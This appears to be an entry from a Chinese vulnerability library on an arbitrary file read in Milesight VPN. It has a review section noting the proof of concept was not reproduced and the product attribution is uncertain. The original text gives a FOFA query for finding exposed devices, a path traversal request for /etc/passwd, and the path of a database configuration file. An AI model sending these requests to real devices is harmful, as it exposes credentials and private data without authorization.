---
source: "wy876 漏洞文库"
id: "vw-2a70f1edc817eb45561a1841"
entity_id: "ve-2a70f1edc817eb45561a1841"
schema_version: "1"
title: "Milesight-VPN任意文件读取漏洞"
product: "Milesight VPN软件/路由器产品归属待定"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无固件/软件版本；请求/../路径，认证未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Milesight/Milesight-VPN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/pp2gsuw28o5qcs9l"
source_status: "recorded"
---

# Milesight-VPN任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Milesight VPN软件/路由器产品归属待定
- 本文讨论：父目录路径遍历文件读取
- 版本、权限与配置前提：无固件/软件版本；请求/../路径，认证未知
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 简介称集成VPN路由器，文件路径milesight_vpn/server/connect.js更指向软件，需核验实际产品
- 双空格请求行与路径规范化注意未述；无响应/修复来源
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 部署平台、鉴权和真实文件读取结果待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
Milesight-VPN是由Milesight Technology Co., Ltd.开发的一种集成了VPN功能的路由器产品。它旨在为用户提供安全、可靠的远程访问和连接解决方案。Milesight-VPN存在任意文件读取，攻击者可以通过利用系统中存在的漏洞，获取未经授权的访问权限并读取系统上的任意文件。

# 二、影响版本
+ Milesight-VPN

# 三、资产测绘
+ fofa`app="Milesight-VPN"`
+ 特征


# 四、漏洞复现
```http
GET  /../etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


数据库配置

```java
/../milesight_vpn/server/connect.js
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pp2gsuw28o5qcs9l>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
